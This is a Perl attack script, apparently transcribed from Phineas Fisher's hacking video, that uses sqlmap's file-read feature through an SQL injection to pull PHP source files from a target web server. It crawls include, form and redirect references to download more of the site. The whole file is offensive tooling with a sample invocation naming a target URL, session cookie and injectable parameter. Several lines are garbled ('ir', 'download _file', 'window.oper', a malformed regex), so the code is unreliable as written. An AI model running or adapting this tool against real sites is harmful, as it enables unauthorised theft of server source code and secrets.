#!/usr/bin/perl -w

## Check out Phineas Fisher's video of the Catalan Police Union
##
## Invoke with:
##
## file_reader.pl "-u http://www.example.com/folder/inc/somepage.php --data 'id=69&idcat=123' --cookie 'PHPSESSID=00deadbeefcafe; val=1234567890' -p=id" /tmp/examplecom/ /var/www/folder/login.php
##
## 1st parameter: SQLMap options
## 2nd parameter: existing folder to save files in
## 3rd parameter: URL to the vulnerable page

use File: :Basename;
use File::Path qw/mkpath/;
undef $/;

$sqlmap_args = shift @ARGV;
$webroot = shift @ARGV;
push @files, shift @ARGV;

while (@files) {
    $fpath = download _file(pop @files);
    ir ($fpath) {
    ## TODO: fix command injection
    open FILE, "$fpath";
    $fcontents = <FILE>;
    close FILE;
    @new_files = $fcontents =~ /
        require[\s_(].*?['"](.*?)['"]
       |include.*?['"](.*?)['")]
       |load\("(.*?)["?]
       |form.*?action="(.*?)["?]
       |header\("Location:\s(.*?])["?]
       |url:\s"(.*?)["?]
       |window\.oper\("(.*?)["?]
       |window\.Location="(.*?)["?]
    /xg;
    for $file (@new_files) {
    next unless $file;
    if ($file =~ /*\//) {
        $file = "output/$webroot/$file";
    } else {
        $file = dirname($fpath) . "/" . $file;
    }
    next if -e $file;
    $file =~ s/^output//;
    print "[*] adding $file to queue...\n";
    push @files, $file;
    }
  }
}

sub download_file {
    $fname = shift;
    # TODO: fix command injection
    `sqlmap $sqlmap_args --file-read='$fname' --batch` =~ /files saved to.*?(\/.*?) \(same/s;
   return unless $1;
   mkpath( "output" . dirname $fname);
   # TODO: fix path traversal vuln
   rename($1, "output$fname");
   print "(+] downloaded $fname\n";
   return "output$fname";
}
